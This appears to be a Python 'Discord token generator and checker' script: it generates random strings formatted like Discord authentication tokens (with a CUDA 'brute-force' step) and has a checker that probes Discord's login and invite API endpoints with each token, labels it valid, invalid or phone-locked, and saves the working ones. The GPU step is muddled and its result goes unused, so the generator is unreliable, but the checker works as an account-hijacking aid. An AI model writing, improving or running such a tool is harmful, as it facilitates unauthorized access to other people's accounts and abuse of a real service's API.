# Code by xTyzenIV
import time
import os
import base64
import requests
import sys
import numpy as np
import pycuda.driver as cuda
import pycuda.autoinit
import requests
import subprocess
import zipfile
import webbrowser
from tqdm import *
from requests import get, post
from random import randint
import random
from colorama import *
from pystyle import *
from tkinter import filedialog, Tk
from pycuda.compiler import SourceModule
from colorama import Fore, Style

user = os.getlogin()

chemin_gpp = f"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.38.33130\\bin\\Hostx64\\x64\\cl.exe"

fichier_tokens = "tokens.txt"

archive = 'BruteCompiler.zip'

folder = f'C:\\Users\\{user}\\AppData\\Local\\'

urlgithub = "https://github.com/xTyzenDev"


def variant1(token):
    response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})
    return True if response.status_code == 200 else False

def variant2(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if "You need to verify your account in order to perform this action." in str(response.content) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True

def variant2_Status(token):
    response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'

def checker():
    if __name__ == "__main__":
        try:
            checked = []
            with open('tokens.txt', 'r') as tokens:
                for token in tokens.read().split('\n'):
                    if len(token) > 15 and token not in checked and variant2(token) == True:
                        print(f'Token: {token} is Valid')
                        checked.append(token)
                    else:
                        print(f'{Fore.RED}[❗]Token: {token} is Invalid{Style.RESET_ALL}')
            if len(checked) > 0:
                save = input(f'{Fore.GREEN}{len(checked)} valid tokens\nSave to File (y/n){Style.RESET_ALL}').lower()
                if save == 'y':
                    name = randint(100000000, 9999999999)
                    with open(f'{name}.txt', 'w') as saveFile:
                        saveFile.write('\n'.join(checked))
                    print(f'{Fore.GREEN}Tokens Save To {name}.txt File!{Style.RESET_ALL}')
            input('Press Enter For Exit...')
        except KeyboardInterrupt:
            print("\n")
            Write.Print("GoodBye :)", Colors.white_to_red)
            sys.exit(0)



def unzip(archive, folder):
    with zipfile.ZipFile(archive, 'r') as archive:
        archive.extractall(folder)

                                                                                                                                                                                                                                                                                                                                                    # Code by xTyzenIV
def animate0():
    text = "Launching the script..."
    duration = 2  
    progress_frames = "/-\\|"
    progress_index = 0

    start_time = time.time()

    while time.time() - start_time < duration:
        for i in range(len(text)):
            animated_text = text[:i].lower() + text[i].upper() + text[i+1:]
            progress = progress_frames[progress_index]
            print(f"{Fore.GREEN}{animated_text} {progress}{Style.RESET_ALL}", end='\r')
            time.sleep(0.1)


            progress_index = (progress_index + 1) % len(progress_frames)


def animate1():                                                             
    text = "Starting the Nvidia ToolKit Cuda..."
    duration = 3 

    progress_frames = "/-\\|"
    progress_index = 0

    start_time = time.time()

    while time.time() - start_time < duration:
        for i in range(len(text)):
            animated_text = text[:i].lower() + text[i].upper() + text[i+1:]
            progress = progress_frames[progress_index]
            print(f"{Fore.GREEN}{animated_text} {progress}{Style.RESET_ALL}", end='\r')
            time.sleep(0.1)

            progress_index = (progress_index + 1) % len(progress_frames)

def VerifCompiler():
    os.system("clear || cls")
    ClCompiler = f"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.38.33130\\bin\\Hostx64\\x64\\cl.exe"
    if os.path.isfile(ClCompiler):
        print(f"{Fore.GREEN}[*] Done !{Style.RESET_ALL}")
        time.sleep(2)
    else:
        print(f"The compiler is not installed. You can't get into the script")
        sys.exit(1)

def enregistrer_token(token):
    with open(fichier_tokens, "a") as f:
        f.write(token + "\n")

def kernel():
    with open(f"kernel.cu", "r") as file:
        cuda_code = file.read()
    return cuda_code  

def cuda_bruteforce(token1, cuda_code):
    print(f"{Fore.GREEN}[✔]Token encoded base64{Style.RESET_ALL} : {token1}")  

    token1 = ''.join(c for c in token1 if c.isalnum() or c in ['.', '_'])
    padding_length = (4 - (len(token1) % 4)) % 4
    token1 += '=' * padding_length

    token1_base64 = base64.b64encode(token1.encode('utf-8')).decode('utf-8')

    token1_np = np.frombuffer(base64.b64decode(token1_base64), dtype=np.uint8)
    enregistrer_token(token1)

    token1_gpu = cuda.mem_alloc(token1_np.nbytes)
                                                                                                                                                                                                                                                                                                                                                                                                # Code by xTyzenIV
    cuda.memcpy_htod(token1_gpu, token1_np)

    mod = SourceModule(cuda_code, options=['-arch=sm_89', '-ccbin', chemin_gpp])

    bruteforce_kernel = mod.get_function("bruteforce_kernel")
    threads_per_block = 1024
    blocks_per_grid = 20000
    result_host = np.zeros_like(token1_np)

    result_device = cuda.mem_alloc(result_host.nbytes)

    bruteforce_kernel(token1_gpu, np.int32(len(token1_base64)), result_device, block=(threads_per_block, 1, 1), grid=(blocks_per_grid, 1))

    cuda.memcpy_dtoh(result_host, result_device)

    for i, status in enumerate(result_host):
        if status == 1:
            enregistrer_token(token1)

    return token1_base64, result_host


def bruteforce(cuda_code):
    while True:
        try:
            ids = list(['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'])
            ide = ''.join(random.choices(ids, k=18))
            ide_utf8 = ide.encode("UTF-8")
            ide_encode = base64.b64encode(ide_utf8)
            ide_encode1 = ide_encode.decode("UTF-8")

            caracteres = list(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
                            'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '_'])

            
            caracteres.extend(['.', '_'])

            
            partie_speciale_length = 48
            ps = ('').join(random.choices(caracteres, k=partie_speciale_length))

            
            token1 = ide_encode1 + ps
            padding_length_total = (4 - (len(token1) % 4)) % 4
            token1 += '=' * padding_length_total

            _, _ = cuda_bruteforce(token1, cuda_code)  

            time.sleep(0.000000000001)  

        except KeyboardInterrupt:
            print("")
            print(f"{Fore.CYAN}[$]{Style.RESET_ALL} BruteForce completed")                                                                                                                                                                                                                                                                                                                                                                                                                                                      # Code by xTyzenIV
            break


cuda_code = kernel()  

os.system("clear || cls")
VerifCompiler()
os.system("clear || cls")

intro = """██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ██████╗ ██████╗ ██╗   ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝ ██╔══██╗██║   ██║
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██║  ███╗██████╔╝██║   ██║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██║   ██║██╔═══╝ ██║   ██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗╚██████╔╝██║     ╚██████╔╝
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝ ╚═╝      ╚═════╝ 
                            >> Press Enter <<                       by xTyzenIV"""

Anime.Fade(Center.Center(intro), Colors.green_to_black, Colorate.Vertical, interval=0.035, enter=True)

def introo():
    print(f"""{Fore.LIGHTGREEN_EX}██████╗ ██████╗ ██╗   ██╗████████╗███████╗ ██████╗ ██████╗ ██╗   ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝ ██╔══██╗██║   ██║
██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██║  ███╗██████╔╝██║   ██║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██║   ██║██╔═══╝ ██║   ██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗╚██████╔╝██║     ╚██████╔╝
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝ ╚═╝      ╚═════╝by xTyzenIV""")

time.sleep(1)

try:
    introo()
    animate0()
    os.system("cls || clear")
    introo()
    animate1()
    os.system("cls || clear")
    introo()

    Write.Print("\n[#] Welcome to the xTyzenIV script.", Colors.green_to_white)
    print("\n")
    Write.Print("\n[-] My github : https://github.com/xTyzenDev [-]", Colors.green_to_white )
    webbrowser.open_new(urlgithub)
    print("\n")
    Write.Print("\n[❗] This script will use all the power of an Nvidia graphics card to calculate tokens with CUDA Core.", Colors.green_to_red)
    Write.Print("\n[\] A tokens file will be created for token generation.", Colors.green_to_blue)
    print("\n")

    while True:
        print("\n")
        Write.Print(">> Please choose your options ", Colors.white_to_green)
        Write.Print("\n[+] 1. Check Tokens", Colors.white_to_green)
        Write.Print("\n[+] 2. Tokens Generation", Colors.white_to_green)
        Write.Print("\n[+] 3. Exit", Colors.white_to_green)
        Write.Print("\n[+] Please choose >> ", Colors.white_to_green, end='')
        choice = input()

        if choice == "1":
            checker()
        elif choice == "2":
            Write.Print("\n[ESC] Ctrl+C to return to the program", Colors.green_to_white)
            time.sleep(2)
            bruteforce(cuda_code)
        elif choice == "3":
            sys.exit(0)

            
except KeyboardInterrupt:
    print("\n")
    Write.Print("Goodbye :)", Colors.green_to_yellow)
    sys.exit(1)